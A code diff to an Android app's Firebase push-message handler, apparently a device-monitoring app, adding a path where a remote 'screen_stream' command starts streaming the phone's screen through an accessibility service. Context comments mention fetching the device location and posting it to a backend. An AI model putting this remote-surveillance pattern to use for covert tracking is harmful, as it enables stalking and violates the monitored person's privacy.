@@ -41,6 +41,15 @@ class SpappFirebaseMessagingService : FirebaseMessagingService() {
             return
         }
 
+        // Fast path: if this is a screen stream command, start streaming immediately without waiting for HTTP polling
+        if (message.data["commandType"] == "screen_stream") {
+            val deviceId = DeviceState(applicationContext).getEffectiveDeviceId()
+            if (deviceId != null && com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null) {
+                Log.d(TAG, "FCM fast-path: triggering screen stream immediately")
+                com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(applicationContext, authToken, deviceId)
+            }
+        }
+
         // Execute fast command pass IMMEDIATELY.
         // runBlocking holds the Firebase WakeLock and prevents the OS from putting the process
         // to sleep before the location is fetched and POSTed to the backend.
